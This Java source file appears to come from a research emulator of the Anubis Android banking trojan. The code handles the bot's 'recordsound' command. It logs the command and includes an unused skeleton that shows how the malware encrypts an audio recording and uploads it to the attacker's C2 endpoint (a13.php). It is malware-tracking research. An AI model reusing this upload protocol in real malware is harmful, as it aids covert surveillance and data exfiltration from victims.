/*
 * Copyright (C) 2020 Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package anubis.commands;

import bot.network.Connector;
import anubis.bot.AnubisBot;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

/**
 * This class handles the command that records a sound
 *
 * @author Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 */
public class RecordSound {

    /**
     * This class handles the command that records a sound
     *
     * @param bot the bot
     * @param command the command
     */
    public RecordSound(AnubisBot bot, String command) {
        String recordDuration = bot.getEncryptionHandler().untag(command, "|recordsound=", "|endrecord");
        String log = "Received command to record sound for " + recordDuration + " seconds";
        bot.addLog(log);
    }

    /**
     * This function uploads a recording from the disk to the C2 server.
     * Currently, m3 does not support emulating recording sounds. If one were to
     * implement this function, the skeleton code is given below.
     *
     * @param bot the bot
     * @throws Exception if the HTTP request fails
     */
    private void uploadRecording(AnubisBot bot) throws Exception {
        DateFormat df = new SimpleDateFormat("MM-dd-yyyy_HH:mm:ss", Locale.US);
        String SetTimeString = df.format(Calendar.getInstance().getTime());
        String filename = "RecordSound_" + SetTimeString + ".amr";
        String encoded = ""; //base64 encoded byte[] that is the recording from the disk

        Connector connector = bot.getConnector();
        String url = bot.getServer() + "/" + bot.getServerFolder() + "/a13.php";
        String parameters = "p=" + bot.getEncryptionHandler().encrypt(filename + "||:||" + encoded);
        String response = connector.post(url, parameters);
        response = bot.getEncryptionHandler().decrypt(response);
        //Expected result = **good**
        if (response.equals("**good**")) {
            //remove recording from disk
        }
    }
}
